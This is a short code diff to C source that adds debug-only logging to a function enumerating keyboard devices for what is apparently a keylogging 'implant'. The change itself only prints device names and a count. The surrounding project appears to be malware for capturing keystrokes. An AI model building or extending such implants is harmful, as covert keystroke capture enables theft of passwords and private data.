@@ -113,7 +113,18 @@ uint8_t fetch_available_keyboards(implant_t *instance) {
             continue;
         }
         TAILQ_INSERT_HEAD(&instance->kbd, kbd, devices);
+
+#ifdef DEBUG
+        DEBUG_LOG("[+] Keyboard found: %s (fd=%d)\n", kbd->name, kbd->fd);
+#endif
     }
+
+#ifdef DEBUG
+    int kbd_count = 0;
+    keyboard_t *k;
+    TAILQ_FOREACH(k, &instance->kbd, devices) { kbd_count++; }
+    DEBUG_LOG("[*] Total keyboards detected: %d\n", kbd_count);
+#endif
 
     for (int i = 0; i < possible_paths; i++) {
         free(char_devices[i]);
